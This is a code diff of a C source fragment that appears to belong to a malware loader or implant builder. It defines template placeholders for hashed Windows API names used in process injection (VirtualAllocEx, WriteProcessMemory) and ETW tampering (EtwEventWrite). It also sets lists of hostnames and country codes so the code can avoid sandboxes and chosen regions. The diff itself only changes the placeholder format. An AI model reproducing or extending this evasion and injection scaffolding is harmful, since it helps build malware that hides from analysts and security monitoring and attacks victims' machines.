@@ -7,48 +7,48 @@ bool is_objhash(ObjHash obj_hash) {
     return (obj_hash.value != 0 || obj_hash.rotation_value != 0 || obj_hash.is_rotation_right != false);
 }
 
-const ObjHash NTDLL_HASH = %MODHASH__ntdll.dll%;
-const ObjHash USER32_HASH = %MODHASH__user32.dll%;
-const ObjHash KERNEL32_HASH = %MODHASH__kernel32.dll%;
+const ObjHash NTDLL_HASH = %__MODHASH__ntdll.dll__%;
+const ObjHash USER32_HASH = %__MODHASH__user32.dll__%;
+const ObjHash KERNEL32_HASH = %__MODHASH__kernel32.dll__%;
 
 // Hashes for function names
-const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
-const ObjHash GET_PROC_ADDRESS_HASH = %FCTHASH__GetProcAddress%;
-const ObjHash QUERY_INFORMATION_PROCESS_HASH = %FCTHASH__NtQueryInformationProcess%;
+const ObjHash LOAD_LIBRARY_HASH = %__FCTHASH__LoadLibraryA__%;
+const ObjHash GET_PROC_ADDRESS_HASH = %__FCTHASH__GetProcAddress__%;
+const ObjHash QUERY_INFORMATION_PROCESS_HASH = %__FCTHASH__NtQueryInformationProcess__%;
 
 // Hashes for system information functions
-const ObjHash GET_COMPUTER_NAME_HASH = %FCTHASH__GetComputerNameA%;
-const ObjHash GET_DISK_FREE_SPACE_HASH = %FCTHASH__GetDiskFreeSpaceExA%;
-const ObjHash GET_SYSTEM_INFO_HASH = %FCTHASH__GetSystemInfo%;
-const ObjHash GET_KEYBOARD_LAYOUT_HASH = %FCTHASH__GetKeyboardLayout%;
-const ObjHash GLOBAL_MEMORY_STATUS_HASH = %FCTHASH__GlobalMemoryStatusEx%;
+const ObjHash GET_COMPUTER_NAME_HASH = %__FCTHASH__GetComputerNameA__%;
+const ObjHash GET_DISK_FREE_SPACE_HASH = %__FCTHASH__GetDiskFreeSpaceExA__%;
+const ObjHash GET_SYSTEM_INFO_HASH = %__FCTHASH__GetSystemInfo__%;
+const ObjHash GET_KEYBOARD_LAYOUT_HASH = %__FCTHASH__GetKeyboardLayout__%;
+const ObjHash GLOBAL_MEMORY_STATUS_HASH = %__FCTHASH__GlobalMemoryStatusEx__%;
 
 // Hashes for language and locale functions
-const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH = %FCTHASH__GetSystemDefaultLangID%;
-const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH = %FCTHASH__GetSystemDefaultLCID%;
+const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH = %__FCTHASH__GetSystemDefaultLangID__%;
+const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH = %__FCTHASH__GetSystemDefaultLCID__%;
 
 // Hashes for memory and thread management functions
-const ObjHash VIRTUAL_ALLOC_HASH = %FCTHASH__VirtualAllocEx%;
-const ObjHash WRITE_MEMORY_HASH = %FCTHASH__WriteProcessMemory%;
-const ObjHash VIRTUAL_PROTECT_HASH = %FCTHASH__VirtualProtectEx%;
+const ObjHash VIRTUAL_ALLOC_HASH = %__FCTHASH__VirtualAllocEx__%;
+const ObjHash WRITE_MEMORY_HASH = %__FCTHASH__WriteProcessMemory__%;
+const ObjHash VIRTUAL_PROTECT_HASH = %__FCTHASH__VirtualProtectEx__%;
 
 // ETW
-const ObjHash ETW_EVENT_WRITE_HASH = %FCTHASH__EtwEventWrite%;
-const ObjHash FLUSH_INSTRUCTION_CACHE_HASH = %FCTHASH__FlushInstructionCache%;
+const ObjHash ETW_EVENT_WRITE_HASH = %__FCTHASH__EtwEventWrite__%;
+const ObjHash FLUSH_INSTRUCTION_CACHE_HASH = %__FCTHASH__FlushInstructionCache__%;
 
 // statical arrays and sizes for avoided hostnames and countries
-const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %SANDBOX__TARGET_HOSTNAME%;
+const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %__SANDBOX__TARGET_HOSTNAME__%;
 const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[] = {
-    %SANDBOX__AVOID_HOSTNAME%
+    %__SANDBOX__AVOID_HOSTNAME__%
 };
 
 // const ObjHash AVOIDED_CPU_NAME_HASHES[] = {
-//     %SANDBOX__AVOID_CPU_NAME%
+//     %__SANDBOX__AVOID_CPU_NAME__
 // };
 
 // List of country codes to avoid
 const uint16_t AVOIDED_COUNTRIES[] = {
-    %SANDBOX__AVOID_COUNTRIES%
+    %__SANDBOX__AVOID_COUNTRIES__%
 };
 
 // Sizes of the avoided hostname and country arrays
